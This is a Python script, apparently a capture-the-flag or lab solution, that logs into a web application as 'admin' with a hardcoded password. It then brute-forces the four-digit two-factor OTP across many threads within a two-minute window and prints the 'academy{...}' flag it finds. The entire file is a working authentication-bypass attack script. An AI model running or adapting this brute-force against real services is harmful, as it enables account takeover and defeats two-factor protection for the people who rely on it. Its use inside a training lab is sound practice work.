#!/bin/python3
from operator import contains
 
import time

import re

import requests

import threading

session = requests.Session()


base_url = input("Please enter the URL of the page: ")

# Hay que cubrir 9000 numeros en 120s
jobs = int(input("Please enter the number of jobs to use: "))

START = 1000
FINISH = 9999

current = START

chunks = 100

done = False

otp = 0

condition = threading.Condition()

mutex = threading.Lock()


def worker_job(job_id: int):
    global current
    global done

    while not done:
        start = 0
        finish = 0
        with mutex:
            start = current
            current += chunks
            finish = current

        if (start > FINISH):
            done = True

        for i in range(start, finish):
            if done:
                break

            response = session.post(f"{base_url}//two_fa", data={"otp": str(i)})
            print(i)
            if not contains(str(response.content), "Invalid OTP or OTP expired"):
                print(f"OTP found: '{i}'")

                print(f"Found flag: {re.search(r"academy\{[^}]+\}", response.text).group(0)}")
                done = True
                break

            if time.monotonic() - start_time >= timeout:
                done = True
                print("Elapsed time reached 2 minutes. Aborting...")
                break


# Iniciar sesion con el admin
login_url = f"{base_url}//login"
credentials = {
    "username": "admin",
    "password": "apple@123"
}

response = session.post(login_url, data=credentials)

if response.status_code != 200:
    print(f"Failed to login: {response.text}")
    exit

start_time = time.monotonic()
timeout = 120  # El OTP dura 2 minutos

# Crear e iniciar los hilos
threads = []
for i in range(jobs):
    t = threading.Thread(target=worker_job, args=(i,))
    threads.append(t)
    t.start()

# Esperar a que todos los hilos terminen
for t in threads:
    t.join()
